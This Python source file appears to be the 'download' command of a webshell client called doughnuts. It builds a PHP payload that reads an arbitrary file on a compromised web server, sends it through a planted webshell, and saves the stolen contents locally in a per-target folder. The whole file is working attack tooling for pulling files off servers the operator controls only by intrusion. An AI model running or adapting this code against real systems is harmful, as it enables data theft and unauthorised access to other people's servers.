from libs.config import alias, color, gget
from libs.myapp import send, base64_encode
from os import path, makedirs


def get_php(web_file_path: str):
    return """function download($fd){
if (@file_exists($fd)){
$fileinfo = pathinfo($fd);
header("Content-type: application/x-" . $fileinfo["extension"]);
header("Content-Disposition: attachment; filename=" . $fileinfo["basename"]);
@readfile($fd);
}
}
download(base64_decode("%s"));
""" % base64_encode(web_file_path)


@alias(True, func_alias="d", _type="FILE", w="web_file_path", l="local_path")
def run(
    web_file_path: str, local_path: str = "",
) -> bool:
    """
    download

    Download file from target system.

    eg: download {web_file_path} {local_path=doughnuts/target/site.com/...}
    """
    php = get_php(web_file_path)
    res = send(php)
    if (not res):
        return
    content = res.r_content
    download_path = local_path or gget("webshell.download_path", "webshell")
    if len(content):
        file_name = path.split(web_file_path)[1]
        if not path.exists(download_path):
            makedirs(download_path)
        file_path = path.join(download_path, file_name).replace("\\", "/")
        with open(file_path, "wb") as f:
            f.write(content)
        print(color.green(f"Downloaded file has been saved to {file_path}"))
        return file_path
    else:
        print(color.red("File not exist / Download error"))
        return ''
